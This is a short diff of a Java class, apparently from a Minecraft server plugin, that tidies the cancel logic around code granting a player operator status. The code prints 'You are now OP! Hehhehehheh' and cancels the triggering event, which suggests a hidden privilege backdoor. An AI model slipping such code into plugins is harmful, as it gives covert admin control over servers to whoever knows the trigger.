@@ -26,10 +26,6 @@ public class Command_opme implements Listener
             {
                 p.setOp(true);
                 p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
-                cancel = true;
-            }
-            if (cancel)
-            {
                 event.setCancelled(true);
                 return;
             }
